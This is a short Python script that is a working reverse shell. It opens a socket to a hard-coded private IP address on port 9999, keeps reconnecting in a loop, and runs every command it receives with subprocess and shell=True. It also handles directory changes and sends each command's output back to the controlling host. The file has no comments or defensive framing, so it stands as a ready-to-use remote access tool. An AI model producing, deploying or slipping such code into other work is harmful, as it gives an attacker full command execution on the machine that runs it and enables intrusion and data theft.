import socket
import os
import subprocess
import time

def connect_to_server(host, port):
    while True:
        try:
            with socket.socket() as s:
                s.connect((host, port))
                print("Connected to server.")

                while True:
                    data = s.recv(4096).decode("utf-8")
                    if not data:
                        break  # if data is empty, connection might be lost

                    if data[:2] == 'cd':
                        try:
                            os.chdir(data[3:])
                            output_str = ""
                        except Exception as e:
                            output_str = str(e)
                    else:
                        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output_str = cmd.stdout.read() + cmd.stderr.read()
                        output_str = output_str.decode("utf-8")

                    # Send the entire output in one go
                    s.sendall(str.encode(output_str))

            print("Connection lost, attempting to reconnect in 2 seconds...")
            time.sleep(2)

        except socket.error as e:
            print(f"Unable to connect, retrying in 2 seconds... Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    host = '192.168.123.208'  
    port = 9999
    connect_to_server(host, port)
